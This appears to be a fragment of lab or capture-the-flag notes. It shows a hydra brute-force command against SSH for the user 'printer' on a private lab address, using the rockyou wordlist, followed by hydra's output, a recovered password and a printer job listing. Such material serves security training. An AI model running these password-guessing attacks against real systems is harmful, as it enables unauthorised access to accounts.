```
hydra -l printer -P /usr/share/wordlists/rockyou.txt 10.10.89.69 ssh
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-01 15:51:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.89.69:22/
[STATUS] 16.00 tries/min, 16 tries in 00:01h, 14344395 to do in 14942:05h, 4 active
[STATUS] 15.00 tries/min, 45 tries in 00:03h, 14344366 to do in 15938:12h, 4 active
[STATUS] 10.14 tries/min, 71 tries in 00:07h, 14344340 to do in 23570:31h, 4 active password123

ID	Name	User	Size	Pages	State	Control
Fox_Printer-4  	Test Page  	anonymous  	1k  	Unknown  	processing since
Mon 01 Aug 2022 09:01:38 PM BST  	
 
```

[[Git_crumpets]]